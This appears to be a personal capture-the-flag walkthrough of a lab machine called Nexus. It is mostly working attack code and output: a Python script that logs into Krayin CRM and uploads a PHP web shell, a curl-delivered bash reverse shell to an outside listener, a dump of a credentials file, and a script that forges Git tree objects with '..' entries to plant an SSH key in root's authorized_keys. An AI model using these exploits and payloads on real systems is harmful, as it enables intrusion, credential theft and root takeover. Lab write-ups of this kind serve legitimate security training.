```
sudo nmap -sCV 10.129.234.54 -oA nexus 
[sudo] password for satoru: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-27 09:18 +0530
Nmap scan report for 10.129.234.54
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.20 seconds
                                                                
```

enum  http://nexus.htb/

![](Attachments/Pasted%20image%2020260827093445.png)

with the password and mail we got earlier login to the crm Krayin version 2.2.0 
CVE-2026-3852

This is the https://github.com/TREXNEGRO/Security-Advisories/blob/main/CVE-2026-38526/poc.md

So i crafted a python script to upload the shell.
```
#!/usr/bin/env python3
import requests
import re
import urllib.parse

target_url = "http://billing.nexus.htb"
login_url = f"{target_url}/admin/login"
upload_url = f"{target_url}/admin/tinymce/upload"

email = "j.matthew@nexus.htb"
password = "N27xh!!2ucY04"

session = requests.Session()

# Step 1: Fetch login page to retrieve fresh CSRF token and initial cookies
print("[+] Fetching login page...")
res = session.get(login_url)
match = re.search(r'name="_token"\s+value="([^"]+)"', res.text)
if not match:
    print("[-] Failed to find _token on login page.")
    exit(1)

csrf_token = match.group(1)
print(f"[+] Found CSRF Token: {csrf_token}")

# Step 2: Authenticate
print("[+] Logging in...")
login_payload = {
    "_token": csrf_token,
    "email": email,
    "password": password
}

login_res = session.post(login_url, data=login_payload)

if "dashboard" in login_res.url or login_res.status_code == 200:
    print("[+] Login successful!")
else:
    print("[-] Login might have failed. Checking session...")

# Step 3: Extract XSRF token for custom header
xsrf_cookie = session.cookies.get("XSRF-TOKEN")
if not xsrf_cookie:
    print("[-] XSRF-TOKEN cookie not found.")
    exit(1)

decoded_xsrf = urllib.parse.unquote(xsrf_cookie)

headers = {
    "X-XSRF-TOKEN": decoded_xsrf
}

# Step 4: Upload Shell
print("[+] Uploading payload...")
files = {
    "file": ("shell.php", '<?php system($_REQUEST["cmd"]); ?>', "image/jpeg")
}

upload_res = session.post(upload_url, headers=headers, files=files)

print(f"[+] Status Code: {upload_res.status_code}")
print(f"[+] Response Body: {upload_res.text}")
```

```
python3 exploit.py
[+] Fetching login page...
[+] Found CSRF Token: QwKDGIa2mv2hrN4cMghKxQlNtQJFgDXCsf9JPYo9
[+] Logging in...
[+] Login successful!
[+] Uploading payload...
[+] Status Code: 200
[+] Response Body: {"location":"http:\/\/billing.nexus.htb\/storage\/tinymce\/e622c96be7f8af6f907fb20379acd9ff.php"}

```

```
 curl "http://billing.nexus.htb/storage/tinymce/e622c96be7f8af6f907fb20379acd9ff.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                            
```

Start a nc listener and get a revshell

```
 curl "http://billing.nexus.htb/storage/tinymce/e622c96be7f8af6f907fb20379acd9ff.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.15.62/4444+0>%261'"


```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.15.62] from (UNKNOWN) [10.129.234.54] 40770
bash: cannot set terminal process group (1459): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nexus:~/krayin/storage/app/public/tinymce$ 

```

we can enumerate the container and check for any creds 

```
www-data@nexus:~/krayin/storage/app/public/data-transfer/samples$ cat /var/www/krayin/.env
<lic/data-transfer/samples$ cat /var/www/krayin/.env              
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

BROADCAST_DRIVER=log
CACHE_DRIVER=file
QUEUE_CONNECTION=sync
SESSION_DRIVER=file
SESSION_LIFETIME=120

MEMCACHED_HOST=127.0.0.1

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=smtp
MAIL_HOST=mailhog
MAIL_PORT=1025
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null
MAIL_FROM_ADDRESS=laravel@krayincrm.com
MAIL_FROM_NAME="${APP_NAME}"
MAIL_DOMAIN=webkul.com

MAIL_RECEIVER_DRIVER=sendgrid

IMAP_HOST=imap.example.com
IMAP_PORT=993
IMAP_ENCRYPTION=ssl
IMAP_VALIDATE_CERT=true
IMAP_USERNAME=your_username
IMAP_PASSWORD=your_password

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@nexus:~/krayin/storage/app/public/data-transfer/samples$ 

```

With the creds we can ssh to the target as jones
```
jones@nexus:~$ whoami
jones
jones@nexus:~$ 

```

lets run linpeas and find out the intended path

```
During the internal security assessment of the target system **Nexus** (`10.129.234.54`), a critical local privilege escalation flaw was identified. An authenticated local user (`jones`) can escalate privileges to full root access by exploiting an unsanitized path traversal logic flaw in an automated background service (`/etc/gitea/template-sync.py`).

### Technical Breakdown

#### 1. Vulnerability Mechanics

The system executes a periodic `systemd` timer (`gitea-template-sync.timer`) running as the `root` user every minute. This service runs a custom synchronization script located at `/etc/gitea/template-sync.py`.

The script performs the following operations:

1. Queries the local Gitea REST API (`http://localhost:3000`) for repositories configured as **Template Repositories**.
    
2. Enumerates files from bare Git repositories using `git ls-tree -r HEAD`.
    
3. Writes the retrieved file blobs into a staging directory structure using `os.path.join()`:
    
    Python
    
    ```
    target = os.path.join(stage_path, filepath)
    target_dir = os.path.dirname(target)
    os.makedirs(target_dir, exist_ok=True)
    with open(target, 'wb') as f:
        f.write(cat_result.stdout)
    ```
    

#### 2. Root Cause Analysis

Python's `os.path.join()` does not validate or strip directory traversal sequences (`../`) within string components when appending paths. Because `stage_path` is defined as `/home/git/template-staging/<owner>/<repo>`, a crafted file path containing five relative parent directory steps (`../../../../../root/.ssh/authorized_keys`) resolves out of the staging directory and points directly to `/root/.ssh/authorized_keys`.

Standard Git clients (`git add`, `git commit`) block the creation of paths containing `..` via `verify_path()`. However, low-level Git plumbing commands or direct Git object manipulation allow raw commit object construction with directory traversal references intact.

### Proof of Concept (Exploitation Steps)

1. **Authentication:** Log into the Gitea web application as user `jones`.
    
2. **Repository Setup:** Create a repository named `rce` and set **"This repository is a template"** in repository settings.
    
3. **Payload Generation:** Generate a local SSH keypair (`/tmp/root_key`).
    
4. **Git Object Manipulation:** Construct raw Git tree/blob objects locally where the object header references `../../../../../root/.ssh/authorized_keys` populated with the public key.
    
5. **Payload Deployment:** Force-push the crafted commit object to the `rce` repository on Gitea.
    
6. **Execution & Access:** Upon execution of `gitea-template-sync.timer` (within 60 seconds), the script writes the public SSH key to `/root/.ssh/authorized_keys`.
    

Bash

```
# SSH connection as root after execution
ssh -i /tmp/root_key root@nexus.htb
```

### Remediation Recommendations

1. **Sanitize File Paths:** Update `/etc/gitea/template-sync.py` to validate and resolve target paths prior to filesystem operations, ensuring output paths remain constrained to `STAGING_DIR`:
    
    Python
    
    ```
    resolved_target = os.path.realpath(target)
    if not resolved_target.startswith(os.path.realpath(stage_path)):
        raise ValueError("Directory traversal attempt detected.")
    ```
    
2. **Principle of Least Privilege:** Run the `gitea-template-sync.service` under a dedicated low-privileged service account (e.g., `git`) rather than `root`.
```

add a repo called rce and make it as template

![](Attachments/Pasted%20image%2020260827134200.png)

```
#!/usr/bin/env python3
import hashlib
import os
import shutil
import subprocess
import sys
import time
import zlib

# Configuration
GITEA_HOST = "git.nexus.htb"  # Hostname or IP of Gitea
USERNAME = "jones"
PASSWORD = "y27xb3ha!!74GbR"
REPO_NAME = "rce"  # Ensure this repository is set as a TEMPLATE in Gitea
KEY_PATH = "/tmp/root_key"


def log(msg):
    print(f"[+] {msg}")


def write_obj(data, obj_type):
    header = f"{obj_type} {len(data)}".encode() + b"\x00"
    full_data = header + data
    sha = hashlib.sha1(full_data).hexdigest()
    obj_dir = os.path.join(".git", "objects", sha[:2])
    os.makedirs(obj_dir, exist_ok=True)
    obj_path = os.path.join(obj_dir, sha[2:])
    if not os.path.exists(obj_path):
        with open(obj_path, "wb") as f:
            f.write(zlib.compress(full_data))
    return sha


def entry(mode, name, sha):
    return f"{mode} {name}".encode() + b"\x00" + bytes.fromhex(sha)


def main():
    log(f"Generating temporary SSH keypair at {KEY_PATH}...")
    if os.path.exists(KEY_PATH):
        os.remove(KEY_PATH)
    if os.path.exists(f"{KEY_PATH}.pub"):
        os.remove(f"{KEY_PATH}.pub")

    subprocess.run(
        ["ssh-keygen", "-t", "ed25519", "-f", KEY_PATH, "-N", ""],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    with open(f"{KEY_PATH}.pub", "r") as f:
        pub_key = f.read().strip() + "\n"

    repo_dir = "/tmp/gitea_exploit_temp"
    if os.path.exists(repo_dir):
        shutil.rmtree(repo_dir)

    os.makedirs(repo_dir)
    os.chdir(repo_dir)

    log("Initializing local Git repository...")
    subprocess.run(
        ["git", "init"],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    log("Constructing malicious Git tree objects...")
    blob_sha = write_obj(pub_key.encode(), "blob")
    readme_sha = write_obj(b"# Template Repo\n", "blob")

    # Build traversal tree structure: ../../../../../root/.ssh/authorized_keys
    ssh_tree = write_obj(entry("100644", "authorized_keys", blob_sha), "tree")
    cur_tree = write_obj(entry("40000", ".ssh", ssh_tree), "tree")
    root_tree = write_obj(entry("40000", "root", cur_tree), "tree")

    fir_tree = root_tree
    for _ in range(4):
        fir_tree = write_obj(entry("40000", "..", fir_tree), "tree")

    final_root_tree = write_obj(
        entry("100644", "README.md", readme_sha)
        + entry("40000", "..", fir_tree),
        "tree",
    )

    ts = int(time.time())
    commit_content = (
        f"tree {final_root_tree}\n"
        f"author Attacker <attacker@nexus.htb> {ts} +0000\n"
        f"committer Attacker <attacker@nexus.htb> {ts} +0000\n\n"
        "Deploy path traversal payload\n"
    )
    commit_sha = write_obj(commit_content.encode(), "commit")

    ref_path = os.path.join(".git", "refs", "heads")
    os.makedirs(ref_path, exist_ok=True)
    with open(os.path.join(ref_path, "main"), "w") as f:
        f.write(commit_sha + "\n")

    remote_url = (
        f"http://{USERNAME}:{PASSWORD}@{GITEA_HOST}/{USERNAME}/{REPO_NAME}.git"
    )
    log(f"Pushing exploit commit ({commit_sha[:8]}) to {GITEA_HOST}...")

    push_res = subprocess.run(
        ["git", "push", remote_url, "main", "--force"], capture_output=True, text=True
    )

    if push_res.returncode == 0:
        log("Successfully pushed payload commit to Gitea!")
        print("\n" + "=" * 60)
        print("NEXT STEPS:")
        print(
            "1. Ensure the repository is marked as a TEMPLATE in Gitea settings."
        )
        print(
            "2. Wait ~60 seconds for gitea-template-sync.timer to execute."
        )
        print("3. Connect via SSH as root:")
        print(f"   ssh -i {KEY_PATH} root@nexus.htb")
        print("=" * 60)
    else:
        print("[-] Git push failed!")
        print(push_res.stderr)


if __name__ == "__main__":
    main()
```